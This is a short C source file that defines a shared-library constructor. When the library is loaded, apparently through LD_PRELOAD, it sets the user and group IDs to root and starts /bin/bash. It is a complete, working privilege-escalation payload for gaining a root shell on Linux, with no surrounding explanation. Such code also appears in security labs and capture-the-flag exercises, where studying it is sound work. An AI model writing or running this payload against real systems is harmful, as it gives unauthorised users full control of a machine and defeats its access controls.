#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void preload() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

